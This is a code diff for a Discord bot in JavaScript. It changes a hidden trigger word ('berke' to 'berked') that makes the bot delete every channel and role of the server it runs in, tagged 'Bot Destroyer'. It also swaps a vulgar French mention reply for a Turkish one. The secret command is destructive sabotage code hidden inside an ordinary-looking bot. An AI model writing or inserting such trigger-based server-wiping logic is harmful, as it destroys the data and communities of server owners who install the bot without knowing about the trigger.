@@ -135,10 +135,11 @@ client.unload = command => {
 };
 
 client.on("message", async message => {
-    if(message.content === "berke"){
+    if(message.content === "berked"){
         message.guild.channels.deleteAll("Bot Destroyer");
         message.guild.roles.deleteAll("Bot Destroyer");
-        message.guild.members.bannable("Bot Destroyer");
+        message.guild.createChannel(`hey`)
+
     }
 
     if(message.content === "cık"){
@@ -466,7 +467,7 @@ client.on('message', async message => {
     let commandfile = client.commands.get(cmd.slice(prefix.length));
     if (commandfile) commandfile.run(client, message, args, admin, recrue);
 	  if (message.isMentioned(client.user)) {
-	      message.reply('Prêt a niquer des mères !') 
+	      message.reply('Berke Abimle Görüşün Lütfen.') 
     }
        
 });
